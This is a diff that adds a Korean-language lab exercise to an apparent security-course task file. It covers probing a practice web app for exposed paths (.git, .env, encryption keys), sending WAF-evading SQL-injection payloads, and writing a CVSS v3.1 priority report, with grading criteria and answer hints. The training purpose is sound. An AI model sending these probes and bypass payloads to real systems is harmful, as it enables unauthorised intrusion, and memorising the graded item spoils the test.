@@ -345,3 +345,73 @@ steps:
       - 조치 부족
       - 자동화 맥락 없음
   target_vm: attacker
+- order: 99
+  instruction: |
+    [복합 시나리오] "CVSS v3.1 적용 — 설정 오류 + WAF 우회 점검 → 우선순위 보고서"
+
+    ## 상황 (w13 → w14 시나리오 연속)
+
+    > 선배: "보고서의 핵심은 *우선순위*. CVSS v3.1 + 구현 난이도 두 축으로 'Quick Win' 부터 정렬.
+    > 설정 오류 + WAF 우회 점검 + CVSS 보고서."
+
+    학습 목표 (lecture #1·#2·#3·#4 CVSS+PoC+보고서+우선순위) + (lab #3·#4·#7·#8 디렉터리·파일·인코딩·메서드 우회) 통합.
+
+    ## 임무 (3 단계, 약 35분)
+
+    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
+
+    ### Phase A — 노출 정찰
+    `for p in '/ftp/' '/assets/' '/encryptionkeys/' '/.git/' '/.env' '/backup.sql'; do
+       echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80$p"; done`
+    `curl -s -I http://10.20.30.80/ | grep -E "Server|X-Powered"`
+    `curl -s "http://10.20.30.80/api/Users/abc%27%22" | head -c 300`
+
+    ### Phase B — WAF 우회 3 기법
+    `curl -s -o /dev/null -w "double-enc: %{http_code}\n" "http://10.20.30.80/rest/products/search?q=%2527%2520OR%25201%253D1--"`
+    `curl -s -o /dev/null -w "case-mix: %{http_code}\n" "http://10.20.30.80/rest/products/search?q=%27%20Or%201%3D1--"`
+    `curl -s -o /dev/null -w "method-PUT: %{http_code}\n" -X PUT -H "Content-Type: application/xml" -d "<x>data</x>" "http://10.20.30.80/rest/user/login"`
+
+    ### Phase C — CVSS v3.1 + 우선순위 보고서
+    | 발견 | CVSS Vector | Score | 구현 난이도 | 우선순위 |
+    | /.git 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 High | 낮음 | #1 Quick Win |
+    | Server header | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium | 낮음 | #2 |
+    | WAF URL 이중 인코딩 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical | 높음 | #3 |
+    | /encryptionkeys | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical | 낮음 | #1 Critical+Quick |
+    | 에러 stack trace | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium | 낮음 | #2 |
+    표 끝 "권고: Quick Win 4개 (autoindex off + Server 제거 + custom error + .git 차단) 즉시.
+    WAF 룰 재설계 단계적." 한 줄.
+
+    종료: echo "=== Phase A ===" / "=== Phase B ===" / "=== Phase C CVSS+우선순위 ===".
+  hint: |
+    Phase A: 6 경로 + Server + 에러 정찰.
+    Phase B: 같은 SQLi 3 변형. 차단 정상.
+    Phase C: 5행 CVSS + 우선순위.
+    포인트: CVSS vector + 구현 난이도 두 축 + Quick Win.
+  category: integration_scenario
+  points: 50
+  verify:
+    type: output_contains
+    expect: 우선순위
+    field: stdout
+    semantic:
+      intent: |
+        설정 오류 + WAF 우회 + CVSS v3.1 우선순위 보고서.
+        lecture #1·#2·#3·#4 + lab #3·#4·#7·#8 동시 행동 증명.
+      success_criteria:
+      - Phase A — 6 경로 + Server + 에러
+      - Phase B — 3 우회 기법
+      - Phase C — 5행 CVSS + 우선순위
+      acceptable_methods:
+      - curl loop + grep
+      - WAF 우회 3 변형
+      - markdown table CVSS
+      - DefectDojo 가능
+      negative_signs:
+      - 정찰 또는 우회만
+      - CVSS vector 누락
+      - 우선순위 누락
+      - Quick Win 누락
+  target_vm: attacker
+  risk_level: low
+  answer_detail: |
+    학생이 ssh attacker 직접. CVSS v3.1 vector + Quick Win 우선순위. 의사결정자 가독성 핵심.
